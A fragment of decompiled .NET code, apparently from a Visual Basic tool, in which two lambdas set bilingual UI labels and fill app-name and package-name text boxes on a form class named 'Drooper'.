			// Token: 0x06000471 RID: 1137 RVA: 0x0005CB38 File Offset: 0x0005AD38
			internal void _Lambda_0024__1()
			{
				this._0024VB_0024Me.labelname.Text = "姓名:";
				this._0024VB_0024Me.textappname.Text = this._0024VB_0024Local_appname;
				this._0024VB_0024Me.labelid.Text = "标识符:";
				this._0024VB_0024Me.textpkgname.Text = this._0024VB_0024Local_PackageName;
			}

			// Token: 0x06000472 RID: 1138 RVA: 0x0005CB9C File Offset: 0x0005AD9C
			internal void _Lambda_0024__2()
			{
				this._0024VB_0024Me.labelname.Text = "App Name :";
				this._0024VB_0024Me.textappname.Text = this._0024VB_0024Local_appname;
				this._0024VB_0024Me.labelid.Text = "Package Name :";
				this._0024VB_0024Me.textpkgname.Text = this._0024VB_0024Local_PackageName;
			}

			// Token: 0x040003EF RID: 1007
			public string _0024VB_0024Local_appname;

			// Token: 0x040003F0 RID: 1008
			public string _0024VB_0024Local_PackageName;

			// Token: 0x040003F1 RID: 1009
			public Drooper _0024VB_0024Me;
		}
	}
}
